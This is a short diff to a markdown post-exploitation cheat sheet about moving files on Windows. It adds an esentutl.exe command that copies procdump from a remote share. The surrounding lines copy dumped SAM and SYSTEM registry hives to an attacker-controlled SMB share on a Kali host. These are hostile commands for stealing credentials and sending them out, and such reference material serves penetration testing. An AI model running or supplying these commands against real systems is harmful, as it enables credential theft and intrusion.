@@ -104,10 +104,14 @@ impacket-smbserver -smb2support monshare . -username "mon.user" -password "monpa
 copy sam.save \\kali\test\sam.save
 copy system.save \\kali\test\system.save
 ```
-
 https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/
 
 https://github.com/timvisee/send-instances/
+
+IWR Download alternative :
+```
+esentutl.exe /y \\$server\$share\$procdump /d $temp\$filename /o
+```
 
 SmbClient
 ---
